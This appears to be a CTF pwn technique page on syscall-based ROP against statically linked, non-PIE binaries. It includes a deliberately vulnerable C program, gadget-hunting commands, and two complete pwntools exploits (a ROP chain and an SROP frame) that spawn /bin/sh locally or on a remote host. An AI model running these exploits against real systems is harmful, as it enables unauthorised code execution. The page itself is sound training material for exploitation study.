---
title: "Static Binaries - Syscall ROP With No Libc to Leak"
category: pwn
subcategory: rop
type: technique
tags: [static-binary, rop, ropchain, syscall, execve, pop-rax, mov-gadget, bss, write, nx, aslr, no-pie, srop, sigreturn, one-gadget, gets, scanf, strcpy, ropgadget, pwntools]
difficulty: medium
summary: "Statically linked means no GOT to leak and no ASLR to beat: every gadget is at a fixed address. Stage registers, write /bin/sh to .bss, and syscall."
when_to_use:
  - "file says 'statically linked' and checksec shows No PIE"
  - "There is no PLT/GOT for libc functions, so ret2libc and GOT overwrite are both off the table"
  - "You need execve(\"/bin/sh\", 0, 0) built entirely out of the binary's own gadgets"
  - "ROPgadget finds thousands of gadgets and you want the shortest correct chain"
  - "rdx is the only register you cannot set, and you want the SROP shortcut"
tools: [pwntools, ROPgadget, ropper, checksec, objdump, readelf, gdb, pwndbg, gef, one_gadget]
related: [rop-fundamentals, rop-srop, rop-ret2csu, rop-stack-pivot, rop-ret2libc, shellcode-crafting, shellcode-seccomp-orw, syscall-tables, rop-gadgets-cheatsheet, pwntools-cheatsheet, exploit-template]
---

## TL;DR

A static binary carries all of libc inside it, at fixed addresses, with no dynamic linker in sight.
There is nothing to leak and nothing to resolve -- but there are tens of thousands of gadgets,
including every `syscall` instruction glibc ever emitted. The job reduces to: put `"/bin/sh"`
somewhere writable, load `rax=59, rdi=&"/bin/sh", rsi=0, rdx=0`, and `syscall`.

## Recognise it

- `file ./vuln` says `ELF 64-bit LSB executable ... statically linked, not stripped`.
- `checksec` shows `RELRO: Partial RELRO`, `PIE: No PIE`, and pwntools notes there is no libc.
- `objdump -R ./vuln` prints `not a dynamic object` -- no GOT entries to hijack or leak.
- `ldd ./vuln` says `not a dynamic executable`.
- The binary is 700 KB+ for a program whose source is 15 lines.
- A stack overflow via `read()`, `gets()`, `scanf("%s")` or `strcpy()` and no `win()` function.
- `ROPgadget --binary ./vuln | wc -l` returns five figures.

## Vulnerable source

```c
/* vuln.c - the same trivial overflow, but built without a dynamic linker */
#include <stdio.h>
#include <unistd.h>

void vuln(void) {
    char buf[64];
    puts("say something:");
    read(0, buf, 0x200);          /* 512 bytes into a 64 byte buffer */
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

```sh
# static, no canary, no PIE: every gadget and every byte of .bss is at a constant address
gcc -fno-stack-protector -no-pie -static -o vuln vuln.c

# the i386 twin, where the syscall entry is `int 0x80` and execve is number 11
gcc -m32 -fno-stack-protector -no-pie -static -o vuln32 vuln.c

# static-pie exists and ruins the "fixed address" assumption - check for it
gcc -fno-stack-protector -static-pie -o vuln_pie vuln.c

file ./vuln
checksec --file=./vuln
ldd ./vuln                                   # "not a dynamic executable"
readelf -S ./vuln | grep -E "\.bss|\.data"   # your scratch space
```

## Theory

### What static linking gives you and takes away

| | Dynamic | Static |
|---|---|---|
| libc base | randomized, must be leaked | baked in, fixed |
| GOT/PLT for libc | yes, hijackable | no libc GOT at all |
| ret2libc | needs a leak | pointless, just call the copy in the binary |
| ret2dlresolve | works under Partial RELRO | impossible, no dynamic linker |
| Gadget count | hundreds | tens of thousands |
| `"/bin/sh"` string | always in libc | only if something references it |
| one_gadget | works on the libc | run it on the binary itself |

The trade is: you lose every leak-based technique, and in exchange you lose every reason to need
one. If the binary is No PIE, there is no randomization left in the picture at all.

### The execve chain

The target is always the same:

```
execve("/bin/sh", NULL, NULL)
    x86-64:  rax = 59 (0x3b), rdi = ptr, rsi = 0, rdx = 0, then `syscall`
    i386:    eax = 11 (0x0b), ebx = ptr, ecx = 0, edx = 0, then `int 0x80`
```

So you need, in rough order of scarcity:

1. `syscall` (ideally `syscall ; ret` so the chain can continue).
2. `pop rax ; ret` -- to set the syscall number.
3. `pop rdi ; ret` -- the path pointer.
4. `pop rsi ; ret` -- `argv`. Often only `pop rsi ; pop r15 ; ret` exists.
5. `pop rdx ; ret` -- `envp`. In glibc 2.34+ static builds the bare form frequently does **not**
   exist; you get `pop rdx ; pop rbx ; ret` or `pop rdx ; pop r12 ; ret`, or nothing at all.
6. A write gadget, if `"/bin/sh"` is not already present.

### Finding the gadgets

```sh
# dump once, grep many times - the file is large, grepping it is instant
ROPgadget --binary ./vuln > gadgets.txt

# the syscall primitive
grep -nE "^0x[0-9a-f]+ : syscall( ; ret)?$" gadgets.txt
ropper --file ./vuln --search "syscall; ret"

# argument setters, including the dirty multi-pop variants
grep -E "pop (rax|rdi|rsi|rdx|rbx) ;" gadgets.txt | head -40

# write-what-where: the gadget that plants "/bin/sh" in .bss
ROPgadget --binary ./vuln --only "mov|ret" | grep -E "mov (qword|dword) ptr \[r"

# is the string already there?
ROPgadget --binary ./vuln --string "/bin/sh"
strings -a -t x ./vuln | grep "/bin/sh"

# let the tool solve the whole thing (it targets execve /bin/sh by default)
ROPgadget --binary ./vuln --ropchain
```

`--ropchain` succeeds on most static x86/x86-64 binaries outright. Read its output rather than
pasting it blindly: it is emitted as Python `p += pack('<Q', ...)` lines, it writes `/bin/sh` into
`.data` byte by byte, and it sometimes picks a `.data` address that the program itself uses.

### Writing "/bin/sh" into .bss

If the string is absent, plant it. The canonical gadget pair is:

```
pop rdi ; ret          -> rdi = destination address (8-byte aligned)
pop rsi ; ret          -> rsi = u64(b"/bin/sh\x00")
mov qword [rdi], rsi ; ret
```

Other shapes that do the same job, in decreasing order of convenience:

| Gadget | Setup needed |
|---|---|
| `mov qword [rdi], rsi ; ret` | `pop rdi`, `pop rsi` |
| `mov qword [rax], rdx ; ret` | `pop rax`, `pop rdx` (or a `rdx` you built) |
| `mov dword [rbp-0x??], eax` | Compiler leftover; awkward but sometimes the only one |
| `xchg` + `stosq` | `rdi` = dest, `rax` = value, `rcx` = count |
| `read(0, bss, 8)` via syscall | No write gadget needed at all -- syscall 0 does it |

That last row is the underrated one: a static binary always has `syscall`, so you can always call
`read(0, bss, 16)` to plant arbitrary bytes, and then call `execve` in a second chain. It costs one
extra round trip and zero gadget hunting.

Pick a `.bss` address with room: `elf.bss(0x200)` in pwntools, away from `stdout`'s buffer.

### When rdx is impossible

If there is genuinely no way to set `rdx`, you have three outs, in order of preference:

1. **SROP.** One sigreturn frame sets `rax`, `rdi`, `rsi`, `rdx`, `rsp` and `rip` at once and only
   needs `syscall` plus `rax = 15`. See `rop-srop`. This is the standard answer.
2. **ret2csu.** `__libc_csu_init`'s tail sets `rdx`, `rsi` and `edi` from `r13`, `r14`, `r15`.
   Present in older static glibc builds; gone from `-static` glibc 2.34+. See `rop-ret2csu`.
3. **Rely on `rdx` already being zero.** After many libc calls `rdx` happens to be `0`. Break at
   the `syscall` in gdb and just look. This is fragile but it costs nothing to check.

## Attack

1. `file` + `checksec` + `ldd` -- confirm static and No PIE.
2. `cyclic` / `cyclic_find` for the offset to the saved return address.
3. Try `ROPgadget --ropchain` first. If it produces a chain, verify and move on.
4. Otherwise collect `syscall ; ret`, `pop rax`, `pop rdi`, `pop rsi`, `pop rdx`, and a write gadget.
5. Plant `"/bin/sh\x00"` in `.bss` (write gadget, or a `read` syscall).
6. Stage `rax=59, rdi=bss, rsi=0, rdx=0` and `syscall`.
7. If `rdx` will not cooperate, drop the whole thing and build an SROP frame instead.

## Exploit

```python
#!/usr/bin/env python3
"""
Static x86-64 ROP: write /bin/sh into .bss, then execve it via a raw syscall.

Local:   ./exploit.py
Remote:  ./exploit.py HOST PORT
Build:   gcc -fno-stack-protector -no-pie -static -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

OFFSET = 72  # 64 byte buffer + saved rbp; measure with cyclic()


def start():
    """Local process by default, remote when argv gives host/port."""
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+40\nc\n")
    return process(BINARY)


def gadget(rop, *insns):
    """rop.find_gadget() but it raises loudly instead of returning None."""
    g = rop.find_gadget(list(insns))
    if g is None:
        log.error("missing gadget: %s", " ; ".join(insns))
    log.success("%-28s %#x", " ; ".join(insns), g.address)
    return g.address


def plant_string(pop_rdi, pop_rsi, mov_store, addr, data):
    """Write `data` to `addr`, eight bytes at a time, with mov [rdi], rsi."""
    data = data.ljust((len(data) + 7) // 8 * 8, b"\x00")
    chain = b""
    for i in range(0, len(data), 8):
        chain += flat(pop_rdi, addr + i, pop_rsi, u64(data[i:i + 8]), 0, mov_store)
    return chain


def main():
    rop = ROP(elf)

    syscall_ret = gadget(rop, "syscall", "ret")
    pop_rax = gadget(rop, "pop rax", "ret")
    pop_rdi = gadget(rop, "pop rdi", "ret")
    pop_rsi = gadget(rop, "pop rsi", "pop r15", "ret")   # the usual dirty variant
    pop_rdx = rop.find_gadget(["pop rdx", "ret"])
    pop_rdx = pop_rdx.address if pop_rdx else None
    mov_store = next(elf.search(asm("mov qword ptr [rdi], rsi; ret")))

    binsh = next(elf.search(b"/bin/sh\x00"), None)
    scratch = elf.bss(0x200)

    chain = b""
    if binsh is None:
        log.info("no /bin/sh in the binary, planting one at %#x", scratch)
        chain += plant_string(pop_rdi, pop_rsi, mov_store, scratch, b"/bin/sh\x00")
        binsh = scratch
    else:
        log.success("/bin/sh already at %#x", binsh)

    chain += flat(pop_rdi, binsh)
    chain += flat(pop_rsi, 0, 0)          # rsi = argv = NULL, r15 = dummy
    if pop_rdx is not None:
        chain += flat(pop_rdx, 0)         # rdx = envp = NULL
    else:
        log.warning("no pop rdx ; ret - rdx must already be 0, else use SROP")
    chain += flat(pop_rax, constants.SYS_execve, syscall_ret)

    # Equivalent one-liners when the symbols/gadgets cooperate:
    #     r = ROP(elf); r.execve(binsh, 0, 0); chain = r.chain()
    #     r = ROP(elf); r.call('execve', [binsh, 0, 0]); chain = r.chain()
    #     r = ROP(elf); r.syscall(constants.SYS_execve, binsh, 0, 0)

    payload = flat({OFFSET: chain}, filler=b"A")
    log.info("payload is %d bytes", len(payload))

    io = start()
    io.recvuntil(b"say something:")
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

The `rdx`-free fallback, using one sigreturn frame instead of four gadgets:

```python
#!/usr/bin/env python3
"""Static binary with no pop rdx: SROP sets every register from one stack frame."""
import sys

from pwn import *

BINARY = "./vuln"

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"

OFFSET = 72


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)


def main():
    rop = ROP(elf)
    syscall_ret = rop.find_gadget(["syscall", "ret"]).address
    pop_rax = rop.find_gadget(["pop rax", "ret"]).address

    binsh = next(elf.search(b"/bin/sh\x00"), None)
    if binsh is None:
        log.error("plant /bin/sh first, then reuse this frame")

    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = binsh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_ret
    frame.rsp = elf.bss(0x400)

    payload = flat({OFFSET: [pop_rax, 15, syscall_ret, bytes(frame)]}, filler=b"A")

    io = start()
    io.recvuntil(b"say something:")
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **static-pie.** `-static-pie` gives you a static binary that *is* relocated. Every gadget
  address becomes an offset and you need a leak again. `checksec` reports `PIE: PIE enabled`;
  believe it over the `statically linked` string from `file`.
- **`pop rdx ; ret` is often gone.** glibc 2.34+ static builds frequently lack it. Grep for
  `pop rdx ; pop rbx ; ret`, `pop rdx ; pop r12 ; ret`, or `mov rdx, ... ; ret`. Otherwise SROP.
- **`syscall` without a trailing `ret`.** Perfectly fine for `execve`, because you never return.
  Only chaining needs the `ret`.
- **Null bytes and whitespace.** `strcpy` truncates at `\x00`, and `scanf("%s")` / `gets()` stop
  at whitespace and newline. Static x86-64 addresses like `0x401b2f` pack with five trailing null
  bytes, which makes `strcpy` a non-starter for multi-gadget chains. Use `read()` if you can;
  otherwise pivot with a single short gadget (`rop-stack-pivot`).
- **`.bss` collisions.** `elf.bss()` returns the *start* of `.bss`, which is often `stdout`'s
  buffer or a lock. Always offset: `elf.bss(0x200)`.
- **Alignment for the write gadget.** `mov qword [rdi], rsi` needs `rdi` 8-byte aligned on some
  microarchitectures and always needs it writable. `.bss` satisfies both.
- **movaps does not apply.** You are issuing raw syscalls, not calling glibc's `system`, so the
  16-byte alignment `ret` padding is unnecessary. If you *do* call the embedded `system`, it is.
- **one_gadget still works** -- run it against the static binary itself, not a libc. The
  constraints are the same. See `rop-one-gadget`.
- **Symbols may be stripped.** `rop.call('execve', ...)` needs `elf.symbols['execve']`. On a
  stripped static binary, fall back to raw gadgets or find `execve` by its syscall stub bytes.
- **i386 differences.** `int 0x80` instead of `syscall`, `eax = 11`, arguments in
  `ebx, ecx, edx, esi, edi`, and `pop ebx ; ret` / `pop ecx ; pop ebx ; ret` are abundant.
  `int 0x80` also exists inside 64-bit static binaries and takes the *32-bit* argument
  registers -- occasionally an easier path than `syscall`.
- **seccomp.** Static CTF binaries love `prctl` sandboxes. Run `seccomp-tools dump ./vuln`
  before building anything; if `execve` is blocked, go to `shellcode-seccomp-orw`.
- **`--ropchain` picks `.data`, not `.bss`.** If the program writes to that `.data` address
  during normal operation, your string is clobbered before the syscall fires.

## Tools

| Tool | Use |
|---|---|
| `file` / `ldd` / `checksec --file=./vuln` | Confirm static, and rule out static-pie |
| `ROPgadget --binary ./vuln --ropchain` | Auto-generates an `execve("/bin/sh")` chain |
| `ROPgadget --binary ./vuln --string "/bin/sh"` | Is the string already present? |
| `ropper --file ./vuln --search "syscall; ret"` | Second opinion on the syscall gadget |
| `pwntools rop.find_gadget(["syscall", "ret"])` | Programmatic lookup, returns `.address` |
| `rop.call('execve', [binsh, 0, 0])` | Works when symbols survived the build |
| `rop.syscall(constants.SYS_execve, binsh, 0, 0)` | Raw syscall chain, no symbols needed |
| `elf.search(b"/bin/sh\x00")` / `elf.bss(0x200)` | String hunting and scratch space |
| `seccomp-tools dump ./vuln` | Check for a filter before committing to `execve` |
| `gdb` + `pwndbg`: `b *SYSCALL ; info registers` | Verify `rax/rdi/rsi/rdx` right before the trap |
